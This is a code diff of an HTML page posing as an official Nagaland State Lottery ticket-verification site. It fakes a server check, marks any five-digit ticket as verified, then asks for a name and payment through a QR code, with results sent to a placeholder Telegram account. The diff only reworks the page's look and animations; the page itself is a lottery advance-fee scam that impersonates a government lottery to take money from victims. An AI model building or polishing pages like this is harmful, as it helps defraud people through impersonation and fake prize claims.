@@ -3,147 +3,156 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Nagaland State Lottery - Official Verification</title>
+    <title>Nagaland State Lottery - Official</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&display=swap" rel="stylesheet">
     <style>
         :root { 
             --gold: #ffb300; 
-            --emerald: #2e7d32; 
             --bg-dark: #0a0f18;
             --card-glass: rgba(255, 255, 255, 0.05);
         }
         body { 
             margin: 0; background: var(--bg-dark); font-family: 'Poppins', sans-serif; color: white;
-            display: flex; flex-direction: column; min-height: 100vh; overflow-x: hidden;
+            overflow-x: hidden; height: 100vh;
         }
 
-        /* Top Bar */
         .top-bar {
             padding: 20px; background: rgba(0, 0, 0, 0.4);
             backdrop-filter: blur(15px); display: flex; justify-content: space-between;
             align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1);
         }
         .logo { font-weight: 800; font-size: 16px; color: var(--gold); letter-spacing: 1px; text-transform: uppercase; }
-        .live-tag { font-size: 10px; background: #ef5350; color: white; padding: 2px 8px; border-radius: 4px; animation: pulse 1.5s infinite; }
 
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-
-        .container { padding: 20px; flex-grow: 1; }
-
-        /* Card Styling */
-        .card {
-            background: var(--card-glass); border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 28px; padding: 30px; margin-bottom: 20px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+        .container { 
+            position: relative; width: 100%; height: calc(100vh - 80px);
+            display: flex; justify-content: center; align-items: flex-start; padding-top: 30px;
         }
 
+        /* Card System */
+        .card {
+            position: absolute; width: 90%; max-width: 400px;
+            background: var(--card-glass); border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 28px; padding: 30px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+            transition: all 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+            box-sizing: border-box;
+        }
+
+        /* Slide Animations */
+        .hidden-left { transform: translateX(-150%) scale(0.8); opacity: 0; pointer-events: none; }
+        .hidden-right { transform: translateX(150%) scale(0.8); opacity: 0; pointer-events: none; }
+        .active-view { transform: translateX(0) scale(1); opacity: 1; pointer-events: all; }
+
+        /* Animated Input Box (As marked in your image) */
         .input-group { margin: 25px 0; }
         label { font-size: 11px; color: #94a3b8; display: block; margin-bottom: 10px; letter-spacing: 1px; }
         
-        input {
-            width: 100%; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1);
-            padding: 18px; border-radius: 16px; color: white; font-size: 18px; outline: none;
-            box-sizing: border-box; text-align: center;
+        .animated-input {
+            width: 100%; background: rgba(255,255,255,0.03); border: 2px solid rgba(255,255,255,0.1);
+            padding: 18px; border-radius: 16px; color: white; font-size: 22px; outline: none;
+            box-sizing: border-box; text-align: center; letter-spacing: 5px;
+            transition: 0.3s;
+            animation: borderPulse 2s infinite; /* Continuous glow animation */
         }
-        input:focus { border-color: var(--gold); }
+        
+        @keyframes borderPulse {
+            0% { border-color: rgba(255, 179, 0, 0.2); box-shadow: 0 0 5px rgba(255, 179, 0, 0.1); }
+            50% { border-color: var(--gold); box-shadow: 0 0 20px rgba(255, 179, 0, 0.3); }
+            100% { border-color: rgba(255, 179, 0, 0.2); box-shadow: 0 0 5px rgba(255, 179, 0, 0.1); }
+        }
 
         .btn-main {
             width: 100%; background: linear-gradient(135deg, #ffb300, #ff8f00);
             color: #000; border: none; padding: 20px; border-radius: 18px;
             font-weight: 800; font-size: 16px; cursor: pointer; text-transform: uppercase;
+            box-shadow: 0 8px 20px rgba(255, 179, 0, 0.3);
         }
 
-        /* Scanner Section */
-        .qr-section { text-align: center; margin-top: 15px; }
-        .qr-code { 
-            width: 200px; height: 200px; background: white; 
-            padding: 10px; border-radius: 12px; margin: 15px auto;
-            border: 4px solid var(--gold);
-        }
-
-        #loader { display: none; text-align: center; margin: 20px 0; }
-        .spinner { width: 30px; height: 30px; border: 3px solid rgba(255,179,0,0.2); border-top: 3px solid var(--gold); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
+        /* Loader */
+        #loader { display: none; text-align: center; margin-top: 15px; }
+        .spinner { width: 30px; height: 30px; border: 3px solid transparent; border-top: 3px solid var(--gold); border-radius: 50%; animation: spin 0.6s linear infinite; margin: 0 auto; }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        .nav-bar {
-            background: rgba(10, 15, 24, 0.9); padding: 15px 0; display: flex; 
-            justify-content: space-around; border-top: 1px solid rgba(255,255,255,0.05);
-        }
-        .nav-item { color: #475569; font-size: 11px; text-decoration: none; font-weight: bold; }
-        .nav-item.active { color: var(--gold); }
+        .qr-code { width: 180px; height: 180px; background: white; padding: 10px; border-radius: 12px; margin: 15px auto; border: 4px solid var(--gold); display: block; }
     </style>
 </head>
 <body>
 
     <div class="top-bar">
         <div class="logo">NAGALAND STATE LOTTERY</div>
-        <div class="live-tag">● LIVE</div>
+        <div style="font-size: 10px; color: #4ade80;">● SERVER ACTIVE</div>
     </div>
 
     <div class="container">
-        <div class="card" id="step-1">
+        <div class="card active-view" id="step1">
             <h2 style="margin: 0; font-weight: 800;">Ticket Check</h2>
             <p style="color: #64748b; font-size: 13px;">Please enter your ticket number for official verification.</p>
             
             <div class="input-group">
-                <label>TICKET NUMBER (5 DIGITS)</label>
-                <input type="number" id="ticket-id" placeholder="0 0 0 0 0">
+                <label>TICKET NUMBER (MAX 5 DIGITS)</label>
+                <input type="number" id="ticket-id" class="animated-input" placeholder="00000" oninput="limitDigits(this)">
             </div>
 
-            <button class="btn-main" onclick="processVerify()">Verify Now</button>
+            <button class="btn-main" onclick="startVerification()">Verify Now</button>
 
             <div id="loader">
                 <div class="spinner"></div>
-                <p style="font-size: 11px; color: #64748b; margin-top: 10px;">CONNECTING TO GOVERNMENT SERVER...</p>
+                <p style="font-size: 11px; color: var(--gold); margin-top: 10px;">VALIDATING TICKET...</p>
             </div>
         </div>
 
-        <div class="card" id="step-2" style="display: none;">
-            <div style="text-align: center; color: #4ade80; margin-bottom: 20px;">
-                <h2 style="margin:0;">✓ TICKET VERIFIED</h2>
-                <p style="color: #94a3b8; font-size: 12px;">Complete registration to claim prize.</p>
+        <div class="card hidden-right" id="step2">
+            <div style="text-align: center; color: #4ade80; margin-bottom: 15px;">
+                <h2 style="margin:0;">✓ VERIFIED</h2>
             </div>
             
             <div class="input-group">
-                <label>FULL NAME</label>
-                <input type="text" id="user-name" placeholder="As per Aadhaar">
+                <label>CUSTOMER NAME</label>
+                <input type="text" id="user-name" class="animated-input" style="font-size: 16px; letter-spacing: normal;" placeholder="Full Name">
+            </div>
+
+            <div style="text-align: center;">
+                <p style="font-size: 12px; color: var(--gold); font-weight: bold; margin: 0;">OFFICIAL PAYMENT SCANNER</p>
+                <img src="YOUR_QR_LINK_HERE" class="qr-code" alt="Scanner">
             </div>
             
-            <div class="qr-section">
-                <p style="font-size: 13px; color: var(--gold); font-weight: bold;">SCAN TO PAY VERIFICATION FEE</p>
-                <img src="YOUR_SCANNER_IMAGE_LINK_HERE" class="qr-code" alt="UPI Scanner">
-                <p style="font-size: 11px; color: #94a3b8;">After payment, click the button below to send screenshot.</p>
-            </div>
-            
-            <button class="btn-main" style="background: var(--emerald); color: white; margin-top: 20px;" onclick="sendToAdmin()">Submit to Official</button>
+            <button class="btn-main" style="background: #2e7d32; color: white;" onclick="finalSubmit()">Confirm & Pay</button>
         </div>
     </div>
 
-    <nav class="nav-bar">
-        <a href="#" class="nav-item active">HOME</a>
-        <a href="admin.html" class="nav-item">ADMIN</a>
-    </nav>
-
     <script>
-        function processVerify() {
-            const t = document.getElementById('ticket-id').value;
-            if(t.length < 5) { alert("Please enter a valid 5-digit number."); return; }
-            
-            document.getElementById('loader').style.display = 'block';
-            
-            setTimeout(() => {
-                document.getElementById('step-1').style.display = 'none';
-                document.getElementById('step-2').style.display = 'block';
-            }, 2500);
+        // Limit input to 5 digits
+        function limitDigits(el) {
+            if (el.value.length > 5) {
+                el.value = el.value.slice(0, 5);
+            }
         }
 
-        function sendToAdmin() {
-            const n = document.getElementById('user-name').value;
-            const t = document.getElementById('ticket-id').value;
-            if(!n) { alert("Please enter your name."); return; }
+        function startVerification() {
+            const ticket = document.getElementById('ticket-id').value;
+            if(ticket.length < 5) {
+                alert("Enter exactly 5 digits.");
+                return;
+            }
 
-            const msg = `OFFICIAL_CLAIM_REQUEST%0AName: ${n}%0ATicket: ${t}%0AStatus: Payment_Done`;
-            window.location.href = `https://t.me/YOUR_USERNAME?text=${msg}`;
+            document.getElementById('loader').style.display = 'block';
+
+            // Animation timing
+            setTimeout(() => {
+                // Slide out Step 1 to the left
+                document.getElementById('step1').classList.remove('active-view');
+                document.getElementById('step1').classList.add('hidden-left');
+
+                // Slide in Step 2 from the right
+                document.getElementById('step2').classList.remove('hidden-right');
+                document.getElementById('step2').classList.add('active-view');
+            }, 2000);
+        }
+
+        function finalSubmit() {
+            const name = document.getElementById('user-name').value;
+            if(!name) { alert("Please enter name."); return; }
+            window.location.href = "https://t.me/YOUR_USERNAME?text=Payment_Done_by_" + name;
         }
     </script>
 </body>
